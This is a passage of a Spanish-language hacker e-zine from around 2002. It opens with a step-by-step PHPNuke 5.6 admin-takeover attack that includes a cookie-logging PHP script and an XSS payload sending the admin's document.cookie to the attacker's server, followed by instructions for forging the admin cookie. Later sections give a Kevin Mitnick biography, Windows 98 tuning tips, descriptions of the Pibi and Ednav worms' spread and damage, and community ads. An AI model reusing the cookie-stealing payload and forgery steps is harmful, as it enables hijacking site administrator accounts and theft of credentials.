============================================================================================

                                     [ NovaHack ]


En esta nueva seccion ire poniendo los bugs que aparezcan en NovaHack la web que administro: http://www.novahack.com les recuerdo que estos bugs yo no fui el que los descubrio, a eso se dedican grupos de seguridad informatica, esto es tomado de la red.

Antes que nada ¿que es un bug? Un bug es un error en un sistema, programa etc. Y un exploit es la manera en que se puede aprovechar ese bug para cierto objetivo.

NovaHack ni CyruxNET se hacen responsables del mal uso de esta informacion.


+----------------------------------------------------------------+
| Fallo en PHPNuke que permite conseguir acceso de administrador |
+----------------------------------------------------------------+

Versiones afectadas: PHPNuke 5.6, y posiblemente las anteriores. 

En las versiones anteriores, mediante un ataque de XSS era posible hacerse con la cookie del administrador, en la que se encontraba el passwod codificado en base 64, por lo que era trivial decodifiarlo. 

A partir de la versión 5.6 los passwords están codificados con MD5. 

Cuando el usuario se autentifica, el PHPNuke convierte el password a MD5 y conprueba que concuerde con el que tiene almacenado en su base de datos. Pero esto no arregla en problema, porque se puede utilizar el password en MD5 sacado de una cookie robada para autentificarse. 

En realidad en PHPNuke crea una cookie codificando en base 64 una linea como esta: 

usuario:pass_en_MD5:lenguaje 

Una vez que se tiene ese pass en MD5 lo único que hay que hacer es colocarlo en una cadena como la anterior, codificar la cadena en base64 y colocarla en una cookie en mi propia máquia. 

Exploit: 

Para este exploit debemos crear los siguientes archivos en un servidor web: 

El archivo cookie.php que contiene lo siguiente: 

$fp = fopen("cookie.txt","a");
fputs($fp, $cookie);
fclose($fp);
print "Message Not Found!"; /* Esto es sólo para que el admin no sospeche */
?>
(como ves debes crear también un archivo llamado cookie.txt) 

y el archivo test.php que contiene:

$admin = base64_encode("cadena") ;
setcookie("admin","$admin",time()+2592000);
?>
(después sustituiremos "cadena" por otra cosa.

1º Se le manda al admin un mensaje privado que contenga: 

document.location.replace('http://yourserver/cookie.php?cookie='+document.cookie); 

2º Se espera a que el admin lea el mensaje, y despues se mira el archivo cookie.txt que habíamos creado en nuestro server. 

3º Copia la cadena que aparece en el cookie.txt entre "admin=" y ":" 

4º Ahora hay que decodificar ese código, poruqe está en base64, para ello puedes utilizar un programa adecuado o visitar http://www.isecurelabs.com/base64.php 

Una vez decodificado deberías tener una cadena como ésta: 

usuario:pass_en_MD5:lenguaje 

5º Ahora hay que crear una cookie con lo conseguido, para ello se utiliza el test.php sustituyendo lo que tenemos por la palable "cadena", así: 

$admin = base64_encode("usuario:pass_en_MD5:lenguaje");
setcookie("admin","$admin",time()+2592000);
?> 

6º Para que esa cookie se cree en nuestra máquina hay que visitar la web objetivo (la que tiene el PHPNuke vulnerable) y autentificarse como un usuario cualquiera. 

7º Una vez dentro hay que mandarse un mansaje privado a uno mismo con el siguiente contenido: Se abre el mensaje y la cookie, si todo ha ido bien aparecerá en nuestra máquina, pero con la dirección de nuestro server, de modo que debemos cambiarle la URL por la del objetivo. 

8º Sólo queda reiniciar el navegador (cerrarlo y abrirlo) y vilver al sitio objetivo, y ya está, verás que estás autentificado como admin. 

Solución: 

Atualizar a una versión mas nueva de PHPNuke. 

Texto por CyruxNET 


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[12]--------------------------------[ Kevin Mitnick ]-----------------------------------[12]
============================================================================================

                                        [ keogh ]


 Como Hacker la carrera de Kevin Mitnick comenzó a los 16 años, cuando
 -obsesionado por las redes de computadoras- rompió la seguridad del sistema
 administrativo de su colegio.
 
 Mr. Mitnick.
 
 Todo aquel que sea conceptualizado como un Internauta se caracteriza por  utilizar un teléfono, un modem y una computadora para muchos fines  diferentes: Divertirnos, informarnos, estudiar, cocinar, planificar viajes  y otras actividades que amplian nuestro quehacer diario. Para Kevin Mitnick  el quehacer diario en sus últimos diez años fue el explorar y "explotar"  computadoras ajenas y sistemas telefónicos. ¿Su profesión?  "Hacker" de  nacimiento.
 
 Este "terrorista electrónico", como lo cataloga el Departamento de Justicia  de los Estados Unidos, conocido en los medios como el "Cóndor", fue capaz de  crear números telefónicos imposibles de facturar (para la compañía  telefónica el era James Bond, con un numero que terminaba en 007), pudo  Apropiarse de 20.000 números de tarjetas de crédito de habitantes de  California y burlarse del FBI por mas de dos años con solo un teléfono  celular alterado y un computador portátil.
 
 Es la peor pesadilla de las empresas de telefonía. Es sospechoso de robar el   software de mas de media docena de fabricantes de teléfonos celulares y  tenia el control de tres oficinas centrales de teléfonos en Manhattan y de  todos los centros de conmutación de California, dándole la habilidad de
 escuchar cualquier conversación telefónica o, si no eras una persona de su  agrado, modificar el teléfono de tu casa de tal manera que, cada vez que  levantaras el auricular, una grabadora pedía que depositaras 25 centavos. 
 
 ¿Cómo se forma un Hacker?
 
 Como Hacker, la carrera de Mitnick tiene sus inicios en 1980 cuando apenas  contaba 16 años y, obsesionado por las redes de computadoras, rompió la  seguridad del sistema administrativo de su colegio, pero no para alterar sus  notas, lo hizo "solo para mirar". Su bautizo como infractor de la ley fue en  1981. Junto a dos amigos entro físicamente a las oficinas de COSMOS de  Pacific Bell. COSMOS (Computer System for Mainframe Operations) era una base  de datos utilizada por la mayor parte de las compañías telefónicas  norteamericanas para controlar el registro de llamadas. Una vez dentro de  las oficinas obtuvieron la lista de claves de seguridad, la combinación de  las puertas de acceso de varias sucursales y manuales del sistema COSMOS. La  información robada tenia un valor equivalente a los 200 mil dólares. Fueron  delatados por la novia de uno de los amigos y debido a su minoría de edad  una Corte Juvenil lo sentencio a tres meses de cárcel y a un año bajo  libertad condicional.
 
 Luego de cumplido el periodo de tres meses el oficial custodio encargado de  su caso encontró que su teléfono fue desconectado y que en la compañía  telefónica no había ningún registro de el.
 
 Sus objetivos iban creciendo a cada paso y en 1982 entro ilegalmente, vía  modem, a la computadora del North American Air Defense Command en Colorado.  Antes de entrar altero el programa encargado de rastrear la procedencia de  las llamadas y desvió el rastro de su llamada a otro lugar. El FBI, creyendo  que había hallado a Mitnick, allano la casa de unos inmigrantes que estaban  viendo televisión.
 
 Un año mas tarde fue arrestado de nuevo cuando era estudiante de la  Universidad del Sur de California. En esta ocasión entro ilegalmente a  ARPAnet (la predecesora de Internet) y trato de accesar a la computadora del  Pentágono. Lo sentenciaron a seis meses de cárcel en una prisión juvenil en  California.
 
 En 1987, luego de tratar de poner su vida en orden, cayo ante la tentación y  fue acusado, en Santa Cruz California, de invadir el sistema de la compañía  Microcorp Systems. Lo sentenciaron a tres años de libertad condicional y  luego de la sentencia su expediente desapareció de la computadora de la  policía local.
 
 Luego busco trabajo en lo que mejor sabia hacer y solicito empleo en el  Security Pacific Bank como encargado de la seguridad de la red del banco. El  banco lo rechazo por sus antecedentes penales y Mitnick falsifico un balance  general del banco donde se mostraban perdidas por 400 millones de dólares y  trato de enviarlo por la red. Afortunadamente el administrador de la red  detuvo el balance antes de que viera la luz.
 
 Ese mismo año inicio el escándalo que lo lanzo a la fama. Durante meses  observo secretamente el correo electrónico de los miembros del departamento  de seguridad de MCI Communications y Digital Equipment Corporation para  conocer como estaban protegidos las computadoras y el sistema telefónico de ambas compañías. 
 
 Luego de recoger suficiente información se apodero de 16 códigos de seguridad  de MCI y junto a un amigo, Lenny DiCicco, entraron a la red del laboratorio  de investigaciones de Digital Corporation, conocida como Easynet. Ambos  Hackers querían obtener una copia del prototipo del nuevo sistema operativo de seguridad de Digital llamado VMS. El personal de seguridad de Digital se  dio cuenta inmediatamente del ataque y dieron aviso al FBI, y comenzaron a  rastrear a los hackers.
 
 Mitnick fue un mal cómplice y, a pesar de que habían trabajado juntos, trato de echarle toda la culpa a DiCicco haciendo llamadas anónimas al jefe de este que trabajaba en una compañía de software como técnico de soporte. Lleno de rabia y frustración DiCicco le confeso todo a su jefe que los denuncio a Digital y al FBI.
 
 Mitnick fue arrestado en 1988 por invadir el sistema de Digital Equipment. La empresa acuso a Mitnick y a DiCicco ante un juez federal de causarles daños por 4 millones de dólares en el robo de su sistema operativo. Fue declarado culpable de un cargo de fraude en computadoras y de uno por posesión ilegal de códigos de acceso de larga distancia.
 
 Adicional a la sentencia el fiscal obtuvo una orden de la corte que prohibía a Mitnick el uso del teléfono en la prisión alegando que el prisionero podría obtener acceso a las computadoras a trabes de cualquier teléfono. A petición de Mitnick el juez lo autorizo a llamar únicamente a su abogado, a su esposa, a su madre y a su abuela y solo bajo supervisión de un oficial de la prisión.
 
 Este caso produjo revuelo en los Estados Unidos, no solo por el hecho delictivo sino por la táctica que utilizo la defensa. Su abogado convenció al juez que Mitnick sufría de una adicción por las computadoras equivalente a la de un drogadicto, un alcohólico o un apostador. Gracias a esta maniobra de la defensa Mitnick fue sentenciado a solo un año de prisión y al salir de allí debía seguir un programa de seis meses para tratar su "adicción a las computadoras". Durante su tratamiento le fue prohibido tocar una computadora
 o un modem y llego a perder mas de 45 kilos.
 
 Para 1991 ya era el Hacker que habia ocupado la primera plana del New York Times y uno de sus reporteros, John Markoff, decidió escribir un libro de estilo Cyberpunk narrando las aventuras de Mitnick. Al parecer a Mitnick no le gusto el libro ya que luego de salir a la venta, la cuenta en Internet de Markoff fue invadida, cambiando su nivel de acceso, de manera de que cualquier persona en el mundo conectada a Internet podía ver su correo electrónico.
 
 En 1992, y luego de concluir su programa, Mitnick comenzó a trabajar en una agencia de detectives. Pronto se descubrió un manejo ilegal en el uso de la base de datos y fue objeto de una investigación por parte del FBI quien determino que habia violado los términos de su libertad condicional. Allanaron su casa pero habia desaparecido sin dejar rastro alguno. Ahora Mitnick se habia convertido en un Hacker prófugo.
 
 El fiscal no estaba tan equivocado cuando pidió la restricción del uso del teléfono. También en 1992, el Departamento de Vehículos de California ofreció una recompensa de 1 millón de dólares a quien arrestara a Mitnick por haber tratado de obtener una licencia de conducir de manera fraudulenta, utilizando un código de acceso y enviando sus datos vía fax.
 
 El Fin
 
 Luego de convertirse en prófugo de la justicia cambio de táctica y concluyo que la mejor manera de no ser rastreado era utilizando teléfonos celulares. De esta manera podría cometer sus fechorías y no estar atado a ningún lugar fijo. Para ello necesitaba obtener programas que le permitieran moverse con la misma facilidad con que lo hacia en la red telefónica.
 
 Luego de varios intentos infructuosos, en cuanto a calidad de información, se encontró con la computadora de Tsutomu Shimomura la cual invadió en la Navidad de 1994. Shimomura, físico computista y experto en sistemas de seguridad del San Diego Supercomputer Center, era además un muy buen Hacker, pero era de los "chicos buenos", ya que cuando hallaba una falla de seguridad en algún sistema lo reportaba a las autoridades, no a otros Hackers.

 Shimomura noto que alguien habia invadido su computadora en su ausencia,  utilizando un método de intrusión muy sofisticado y que el nunca antes habia  visto. El intruso le habia robado su correo electrónico, software para el  control de teléfonos celulares y varias herramientas de seguridad en Internet. Allí comenzó la cuenta regresiva para Mitnick. Shimomura se propuso como orgullo personal atrapar al Hacker que habia invadido su privacidad.
 
 Hacia finales de enero de 1995, el software de Shimomura fue hallado en una cuenta en The Well, un proveedor de Internet en California. Mitnick habia creado una cuenta fantasma en ese proveedor y desde allí utilizaba las herramientas de Shimomura para lanzar ataques hacia una docena de corporaciones de computadoras, entre ellas Motorola, Apple y Qualcomm.
 
 Shimomura se reunio con el gerente de The Well y con un tecnico de Sprint (proveedor de servicios telefonicos celulares) y descubrieron que Mitnick habia creado un numero celular fantasma para accesar el sistema. Luego de dos semanas de rastreos determinaron que las llamadas provenian de Raleigh, California.
 
 Al llegar Shimomura a Raleigh recibio una llamada del experto en seguridad de InterNex, otro proveedor de Internet en California. Mitnick habia invadido otra vez el sistema de InterNex, habia creado una cuenta de nombre Nancy, borrado una con el nombre Bob y habia cambiado varias claves de seguridad incluyendo la del experto y la del gerente del sistema que posee los privilegios mas altos. De igual manera Shimomura tenia informacion sobre la invasion de Mitcnick a Netcom, una red de base de datos de noticias.
 
 Shimomura se comunico con el FBI y estos enviaron a un grupo de rastreo por radio. El equipo de rastreo poseia un simulador de celda, un equipo normalmente utilizado para probar telefonos celulares pero modificado para rastrear el telefono de Mitnick mientras este esta encendido y aunque no este en uso. Con este aparato el celular se convertiria en un transmisor sin que el usuario lo supiera.
 
 A medianoche terminaron de colocar los equipos en una Van y comenzo la busqueda de la señal, porque eso era lo que querian localizar; no buscaban a un hombre porque todas las fotos que tenian eran viejas y no estaban seguros de su aspecto actual, el objetivo de esa noche era determinar el lugar de procedencia de la señal. Ya para la madrugada localizaron la señal en un grupo de apartamentos pero no pudieron determinar en cual debido a interferencias en la señal.
 
 Mientras esto ocurria la gente de InterNex, The Well y Netcom estaban preocupados por los movimientos que casi simultaneamente Mitnick hacia en cada uno de estos sistemas. Cambiaba claves de acceso que el mismo habia creado y que tenian menos de 12 horas de creadas, utilizando codigos extraños e ironicos como no,panix, fukhood y fuckjkt. Estaba creando nuevas cuentas con mayores niveles de seguridad como si sospechara que lo estaban vigilando.
 
 El FBI, Shimomura y el equipo de Sprint se habian reunido para planificar la captura. Shimomura envio un mensaje codificado al buscapersonas del encargado en Netcom para advertirle que el arresto se iba a realizar al dia siguiente, 16 de Febrero. Shimomura envio el mensaje varias veces por equivocacion y el encargado
 interpreto que Mitnick ya habia sido arrestado adelantandose a realizar una copia de respaldo de todo el material que Mitnick habia almacenado en Netcom como evidencia y borrando las versiones almacenadas por Mitnick. Habia que realizar el arresto de inmediato, antes de que Mitnick se diera cuenta de que su informacion habia sido borrada.
 
 Cuando faltaban minutos para dar la orden el simulador de celdas detecto una nueva señal de transmision de datos via celular y simultanea a la de Mitnick, muy cerca de esa zona. Algo extraño estaba haciendo Mitnick con las lineas celulares, Shimomura trato de advertirle al agente del FBI pero ya todo estaba en manos de ellos, Shimomura de ahora en adelante no era mas que un espectador privilegiado. El FBI no pensaban hacer una entrada violenta porque no creian que Mitnick estuviera armado, pero tenian que actuar muy rapido porque sabian el daño que este hombre podia causar en un solo minuto con una computadora. Se acercaron lentamente hasta la entrada del apartamento de Mitnick y anunciaron su presencia, si no les abrian la puerta en cinco segundos la echarian abajo. Mitnick abrio la puerta con toda calma y el FBI procedio a arrestarlo y a decomisar todo el material pertinente discos, computador, telefonos celulares, manuales, etc.
 
 De regreso a su hotel Shimomura decide chequear la contestadora telefonica de su residencia en San Diego. Se quedo en una pieza cuando escucho la voz de Mitnick quien le habia dejado varios mensajes con acento oriental en tono de burla. El ultimo de estos mensajes lo habia recibido ocho horas despues de que Mitnick habia sido arrestado y antes de que la prensa se hubiera enterado de todo el asunto. Como se realizo esa llamada aun es un misterio al igual que el origen y objetivo de la segunda señal de Mitnick.
 
 Este persistente hacker actualmente esta siendo juzgado y enfrenta dos cargos federales, uso ilegal de equipos de acceso telefonico y fraude por computadoras. Puede ser condenado por hasta 35 años y a pagar una multa de hasta medio millon de dolares. Mitnick también es sospechoso de robar el software que las compañías telefónicas piensan usar para todo tipo de procesos, desde la facturación hasta el seguimiento del origen de una llamada pasando por la descodificación de las señales de los teléfonos celulares para preservar su privacidad.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[13]----------------------------Windows 9x más y más ESTABLE----------------------------[13]
============================================================================================

                                       [ Roswell ]


NOTA DEL EDITOR DE NHZ : Este texto me fue proporcionado por Suen pero el autor original es Roswell.

"¿Qué? ¡Estable! ¿Estás bien? ¡Mi ratón bloqueado!, tengo mensajes sobre un fondo azul como: Error en VxD" 

Efectivamente, durante la instalación de Windows, algunas VxD* no son instaladas (¡gracias Microsoft!) (*VxD = controlador de dispositivo virtual). Aquí tenemos una manera de resolver este problema: 

Hacer clic con el botón derecho del ratón en Mi PC y seleccionar Propiedades. Ir a la pestaña Administrador de Dispositivos, en esta ventana hacer doble-clic sobre Dispositivos de Sistema. La operación es un poco larga pero será beneficiosa; ahora haciendo clic sobre cada dispositivo, pulsamos en Propiedades y elegimos la pestaña Controlador/Detalles del archivo del controlador...  Si ves: C:\Windows\System
onfigmg.vxd quiere decir que estás utilizando el controlador adecuado. Sin embargo si ves: C:\Windows\System\vmm32.vxd(configmg.vxd)  entonces es que Windows utiliza un controlador genérico para este dispostivo cuando podría utilizar el controlador adecuado pero ¡no está instalado!

¡Ahora instalamos los VxD que faltan, son 7! 

Vcomm.vxd = controlador de comunicación. 
Vdd.vxd = controlador del dispositivo de vídeo. 
Vflatd.vxd = dispositivo virtual del adaptador de vídeo. 
Vdmad.vxd = controlador de acceso directo a memoria (DMA). 
Vmouse.vxd = controlador del ratón. 
Configmg.vxd = administrador de configuración de la placa base. 
Ntkern.vxd = controlador del núcleo (kernel). 

Estos controladores se encuentran en los ficheros CAB del CD de Windows 98 (CAB 50 para Windows 98 SE y CAB 45 para Windows 98 versión primera). Seleccionar los controladores que faltan y copiarlos en el directorio C:\Windows\System. Reiniciamos Windows y volvemos a echar un vistazo al Administrador de Dispositivos del Sistema, ¡ahora Windows utiliza los controladores adecuados! 
¡Tenemos un Windows más rápido y sobre todo más estable! 
    

¡ Todavía más estable ! 
(o como forzar Windows a no utilizar 36 maneras de administrar el bus PCI) 

Hacer clic con el botón derecho del ratón sobre Mi PC y seleccionar Propiedades, después sobre la pestaña Administrador de Dispositivos\Dispositivos de Sistema\Bus PCI\Propiedades\Control de IRQ. Desactivar todas las opciones salvo: Obtener la tabla IRQ mediante la tabla de especificaciones MS. Esto forzará Windows a utilizar sólo esta tabla. Como siempre, reiniciar el equipo tras esta modificación (de todas maneras Windows os pide que se haga).
    

¡ Un inicio más rápido y más recursos del sistema ! 

¿Prácticamente trabajas con Windows sólo? Entonces, aquí encontrarás como acelerar el arranque: 
Menu Inicio\Ejecutar \msconfig y aceptar. 
En el programa de configuración del sistema desactivar las siguientes opciones: Procesar el archivo Config.sys, Procesar el archivo Autoexec.bat. Ahora seleccionar la pestaña Inicio. Vamos a impedir que Windows cargue ciertos programas que consumen recursos del sistema y ralentizan su velocidad como el administrador de la tarjeta gráfica, el pequeño mensaje al comienzo del arranque para recordarnos de registrar los programas, la búsqueda acelerada de Microsoft Office, etc. Personalmente, yo he conservado solamente Task Monitor, así como LoadPowerProfile (los 2). Antes de estas modificaciones, esperaba alrededor de un minuto para poder utilizar Windows y me quedaban 86% de recursos disponibles. Ahora, ¡el arranque tarda menos de 20 segundos y tengo un 95% de recursos disponibles! 
  

Agradecimientos a Roswell

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[14]-----------------------------------[ Viruteca ]-------------------------------------[14]
============================================================================================

                                        [ keogh ]


+-------------+
| W32/Pibi@MM |
+-------------+

Pibi es un gusano reportado el 13 de Septiembre del 2002 de alta propagación masiva en Internet a través de mensajes de correo electrónico, vía el canal de Chat IRC y de la popular red de archivos compartidos Kazaa. 

El gusano se propaga en uno de 3 formatos de mensajes de correo con un archivo anexado de nombre setup.exe, uno de los cuales simula haber sido enviado por Microsoft, conteniendo un supuesto parche para una vulnerabilidad del navegador Internet Explorer. 

Es un PE (Portable Ejecutable) e infecta Windows 95/98/NT/Me/2000/XP, incluyendo los servidores NT/2000/XP 

Pibi ha sido desarrollado en lenguaje Visual C++, tiene 30 KB de extensión y está comprimido con el utilitario UPX (Ultimate Packer for eXecutables): 

http://upx.sourceforge.net 

Los formatos de correo son los siguientes: 

De: 
Asunto: Hello
Mensaje: You will find all you need in the attachment.
Anexado: setup.exe


De: john@barrysworld.com
Asunto: Hello
Mensaje: You will find all you need in the attachment.
Anexado: setup.exe


De: "Microsoft" 
Reply-To: "Microsoft" 
Asunto: Internet Explorer vulnerability patch
Mensaje: You will find all you need in the attachment.
Anexado: setup.exe


Al ser ejecutado el archivo infectado, el gusano se autocopia la carpeta C:WindowsSystem con el nombre de winsysnnn.exe (el valor nnn es un número aleatorio de 3 dígitos) y para activarse la próxima vez que se inicie el sistema, genera la siguiente llave de registro: 

[HKCUSoftwareMicrosoftWindowsCurrentVersionRun] Windows = "task32 sys" 

El gusano intenta anular los procesos de ejecución de los programas que tengan la sub-cadena "AV" (mayormente relacionada a los software antivirus). Luego crea la siguiente llave de registro: 

[HKLMSoftwareRedCellinfected] "Yes" 

También se autocopia a la carpeta C:WindowsSystem con el nombre "win32sysnnn.zip" (el valor nnn es un número aleatorio) y si el compresor WinZip se encuentra instalado en el sistema, el gusano alterará las instrucciones del script.ini, en caso que el usuario tenga instalado el software mIRC para Chat. 

Este script contiene las instrucciones para auto-enviar el gusano infectado, bajo formato .ZIP a otros usuarios que se encuentren conectados en una misma sesión de Chat. 

Asimismo el gusano se auto-copia a la carpeta de Kazaa con los siguientes nombres: 

mirc6.exe 
winamp3.exe
wincrack.exe 
icq2002.exe 


Luego copia el código viral en formato de codificación Base64 en el archivo C:Msbootlog.sys, el cual usará para crear los archivos anexados a los mensajes que serán enviados a los buzones de correo hallados en los archivos con extensión .HTM de la carpeta "Archivos Temporales de Internet". 

La codificación Base64 es un complejo diseño de secuencias arbitrarias de octetos en un formato que no puede ser leído normalmente. Para este propósito se emplea un sub-categoría de 65 caracteres [A-Z a-z 0-9 + / =] de codificación ASCII (American Standard Code for Information Interchange), habilitando 6 bits para ser representados por caracteres imprimibles. 

La información relacionada a la cuenta de correo y del servidor SMTP es capturada del registro, en caso contrario el gusano usa una dirección codificada con su propio servidor SMTP: 

smtp.barrysworld.com, configurado para enviar mensajes cada 50 segundos. 

El gusano muestra la siguiente caja de diálogo: 

"This program has performed sn illegal operation" 

Si la fecha es 15 de Septiembre, mostrará una ventana: 

I-Worm/PiecebyPiece
"Cause nothing ever last forever we're like flowers in his vase, together.[...]" 

El SCRIPT.INI es un archivo capaz de afectar a todos los programas basados en las redes del IRC (Internet Chat Relay). Contiene comandos que permiten a otras personas controlar en forma remota las sesiones de IRC de un usuario infectado, observar las conversaciones que éste mantiene y otras acciones adicionales, tales como terminar o cancelar una conversación o sesión de Chat. 

Este script se puede reproducir auto-enviándose a través de una transferencia DCC (Direct Control Command) y al hacerlo, toma ventaja de dos funcionalidades potencialmente peligrosas del mIRC: la configuración de recepción automática DCC (auto-DCC-get) y la ejecución automática de cualquier archivo llamado SCRIPT.INI que se encuentre en el directorio de instalación de la aplicación. 

El SCRIPT.INI puede realizar, entre otras acciones, lo siguiente: 

Re-direccionar todos los mensajes enviados por el usuario, en forma abierta o privada a otro canal. 
Interrumpir la sesión de IRC cuando otra persona ejecute un comando determinado. 
Permitir el acceso total al sistema del usuario afectado, a través de algún tipo de aplicación como el fserve, al enviar remotamente cualquier comando predefinido. 
Bloquear o alterar mensajes procedentes del o de los sistemas infectados. 
Enviarse en forma automática a otros usuarios.



+----------------+
| VBS/Ednav.B@MM |
+----------------+

Ednav.B, es un peligroso gusano polimórfico muy destructivo, reportado el 17 de Septiembre del 2002, que se propaga masivamente a través de mensajes de correo, vía MS Outlook con un archivo anexado, de nombre aleatorio con la extensión .vbs y hace lo propio, vía la popular red Kazaa. Borra archivos y llaves de registro de Windows. El contenido del mensaje simula ser una actualización para servidores de correo. 

Este Visual Basic Script infecta los sistemas Windows 95/98/NT/Me/2000/XP, incluyendo los servidores NT/2000. 

Al ejecutar el archivo infectado, en forma inmediata, el gusano sobre-escribe los archivos con extensión .VBS en todas las carpetas y sub-carpetas del sistema, dejándolos inutilizables. 

Si el gusano no encuentra el Microsoft Windows Script Host en el sistema, no procederá a infectarlo. Cabe mencionar que para facilitar los procesos o automatizar las tareas la mayoría de equipos lo tienen instalado. 

El gusano busca dentro de la carpeta C:\windir\ (por defecto es C:\Windows o C:\Winnt), la carpeta SamplesWSH. Si ésta no existe, el gusano no podrá propagarse a través de KaZaA. En caso de hallarla procederá a modificar la siguiente llave del registro de Windows, para que otros usuarios puedan descargar archivos infectados desde esta carpeta: 

[HKEY_CURRENT_USER\Software\Kazaa\Local\Content] Dir2 = 012345:C:%windir%SamplesWSH DisableSharing = 0 

Si la fecha del sistema es 1o o 31 del mes, el gusano borra todos los archivos de las capeta C:\Mis Documentos y los de todas sus sub-carpetas, mostrando uno de estos 2 mensajes: 

Joke: Do not click the OK button or your My Documents files will get lost! 

Serious: We have to laugh at our problems. 

Cada vez que el usuario ejecute un archivo Visual Basic Script infectado, el gusano procederá a auto-enviar masivamente mensajes de correo, haciendo uso de la Libreta de Direcciones de MS Outlook, con dicho archivo, previamente infectado. 

Si la fecha del sistema es 1o, 30 o 31 del mes actual, el gusano borrará todos los archivos del Escritorio de Windows, los cuales tienen acceso directo para su ejecución, desde ese entorno gráfico. 

Este gusano polimórfico también auto-envía un mensaje a las siguientes direcciones de correo: 

info@mcafee.com
virus_research@nai.com
virus_doctor@trendmicro.com
support@support.trendmicro.com
av_query@trendmicro.com
samples@f-secure.com
anti-virus-support@f-secure.com
support@sophos.com
vsample@avertlabs.com


Otra función del gusano muestra un falso mensaje para engañar al usuario: "The script demostrates how to access Excel using the windows Script host" 

Asimismo, crea un enlace a C:%windir%Notepad.exe en el Escritorio del sistema infectado. 

En los días 29, 30 o 32 esta variante borra una llave del registro de Windows, dejando inutilizable el sistema: 

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion] 

Si la fecha es 1o 0 2 del mes vigente, borra la siguiente llave de registro: 

[HKEY_CURRENT_USER\SOFTWARE] 

Los payload de este nocivo gusano polimórfico son: 

Se propaga masivamente por correo tratando de saturar los servidores. Sobre-escribe archivos con extensión .VBS, dejándolos inutilizables. Intenta infectar a los usuarios de la red Kazaa. Borra llaves del registro de Windows en fechas determinadas. Provoca fallas en el sistema operativo o lo deja inutilizable.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[15]---------------------------[ Colabora con NovaHack Zine ]---------------------------[15]
============================================================================================

                                     [ NovaHack Zine ]


¿Quieres colaborar con NovaHack Zine? Si es asi solo tienes que mandarnos tu texto a nhz@novahack.com

El texto tiene que hablar de hack, crack, virus, programacion, underground, redes, etc. Todo lo que tenga que ver con el mundo underground o seguridad informatica.

Lo unico que tienes que hacer es mandar el texto en formato TXT a la direccion nhz@novahack.com


Otra cosa si eres bueno para dibujar con la PC, te retamos para que hagas el logo para NHZ ya que no contamos con uno. Mandanos tu propuesta de logo a nhz@novahack.com lo someteremos a votacion y eligiremos el mejor.

s4lu2 y esperamos sus e-mails.

http://www.novahack.com/nhz

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[16]-------------------------[ Comunidad UnderGround de Mexico ]------------------------[16]
============================================================================================

                                         [ CUM ]

Soy hkm, miembro de Hakim.Ws [http://www.hakim.ws], por medio de esta ezine me gustaria informarles acerca de una comunidad (foros) para mejor difusion del Underground Mexicano. Esta comunidad es separada de nuestra pagina y SIN PROMOCION de ningun tipo, el proposito es unificar los foros de paginas Underground de Mexico. El nombre de esta comunidad es: Comunidad Underground de Mexico (C.U.M.), el url: http://www.hakim.ws/cum.

Como podran ver en la pagina de C.U.M. no ganamos nada regalando foros. Todo lo hacemos simplemente por que queremos mejorar el nivel del Underground Mexicano y que mejor manera de hacerlo que compartiendo conocimientos.

Por el momento son varios los grupos que tienen su foro hosteado con nosotros entre ellos estan: Phreakers Mexico [http://www.phreakers.com.mx], Hakim.Ws [http://www.hakim.ws], 403af Team [http://www.403af.net] y The Mexican Underground [http://themu.cjb.net].

Estamos invitando a mas grupos que deseen formar parte de la Comunidad. Si deseas contribuir al Underground de Mexico te pedimos que pongas un link / banner / minibanner a los foros. Los banners / minibanners los pueden encontrar en http://www.hakim.ws/cum/banners pueden elegir el que quieran. (Tenemos 33 opciones para que elijan la que mas se adapte al diseño de su web).

Saludos.


hkm
@hakim.ws
@phreakers.com.mx

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[17]---------------------------[ The Mexican UnderGround ]------------------------------[17]
============================================================================================

                                         [ TMU ]

+-----------------+
| Historia de TMU |
+-----------------+

The Mexican UnderGround nace a finales de Agosto del 2002 cuando se me ocurrio formar una
pagina donde se distribuyeran discos con programas hack y algunas distribuciones de Linux
y tambien organizar conferencias para ayudar a los Newbies en su camino por este mundillo
luego se contactaron con el dos personas interesadas en apoyar este proyecto luego por 
motivos de trabajo ninguno de ellos se quedaron en el proyecto y en esos dias se une Aztek
quien tenia la pagina de Aztek Pride la cual desaparece y se une a The Mexican UnderGround.

+---------------+
| Vision de TMU |
+---------------+

The Mexican UnderGround pretende apoyar el mundo del Under realizando las conferencias que 
hasta el momento no se han realizado con frecuencia [pero que se empezaran a realizar mas 
seguido], con cursos [que pronto empezaran a funcionar], con programar y con textos que
ponemos a su disposicion en nuestra pagina.

+-----------------+
| Agradecimientos |
+-----------------+

Bueno pues por ultimo quiciera agradecerle a Keogh por permitirme publicar esta pequeña  
reseña en su e-zine y por el apoyo que me a dado en la realizacion de TMU tambien quiero 
agradecerle a toda la gente que me a brindado un apoyo sincero y a todos los visitantes de 
nuestra pagina ... A todos ustedes MUCHAS GRACIAS !!!

By YeaYou & aztek 
http://themu.cjb.net

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


============================================================================================
[18]------------------------------[ Sitios de interes ]---------------------------------[18]
============================================================================================

                                    [ NovaHack Zine ]


Pues ahora los sitios de interes de este numero son:

1. http://www.novahack.com  Esta pagina es la del editor de esta ezine, aqui se habla de hack, crack, virus, programacion, noticias y temas underground. Con muchas descargas. Mexicana.

2. http://www.prehackers.com  Distribuidor de esta ezine, contiene uno de los mejores foros en español que existen, así como una biblioteca con gran numero de textos. Española

3. http://hakim.ws/cum  Foros de la Comunidad Underground Mexicana, van iniciando pero parece que van por buen camino. Mexicana

4. http://themu.cjb.net La web oficial de The Mexican UnderGround. Aqui encontraras fechas para conferencias y cursos, asi como algunas descargas de textos y programas. Mexicana.


Si quieres que tu link aparezca aqui mandame un email a nhz@novahack.com


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


============================================================================================
